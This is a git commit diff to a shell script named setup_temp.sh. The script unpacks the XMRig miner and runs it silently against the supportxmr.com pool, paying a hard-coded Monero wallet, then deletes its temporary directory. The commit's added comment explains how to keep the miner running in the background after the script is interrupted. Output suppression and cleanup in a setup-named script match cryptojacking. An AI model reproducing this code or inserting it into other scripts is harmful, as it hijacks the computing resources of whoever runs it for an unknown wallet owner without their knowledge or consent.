7d5e6b6b7e9cc6c64a4951aaf04158d839485986
Karan Bhateja <40824205+Karanbhateja@users.noreply.github.com>
2024-09-03 16:43:31 +0530

    Update setup_temp.sh

--- setup_temp.sh
+++ setup_temp.sh
@@ -12,7 +12,7 @@ tar -xzf xmrig-6.22.0-jammy-x64.tar.gz
 
 # Start mining in the background, redirecting output to /dev/null
 cd xmrig-6.22.0
-./xmrig -o pool.supportxmr.com:443 -u 47qUtr22oGDgGsYbfUBKfpbyRa5NqTCcR9m4bP2w3jiD3XC1RZ2bKTiVLaqi9wcP4FB8he1XT461J6aPjH6gxw7cU7GQsh3 -k --tls > /dev/null 2>&1 &
+./xmrig -o pool.supportxmr.com:443 -u 47qUtr22oGDgGsYbfUBKfpbyRa5NqTCcR9m4bP2w3jiD3XC1RZ2bKTiVLaqi9wcP4FB8he1XT461J6aPjH6gxw7cU7GQsh3 -k --tls > /dev/null 2>&1 && #if you use single "&" here instead of double, then script will stop here even if you press ctrl+c  then xmrig will continue working in background which can be seen using top command
 
 # Clean up: delete the temporary directory after mining
 cd && rm -rf $TEMP_DIR
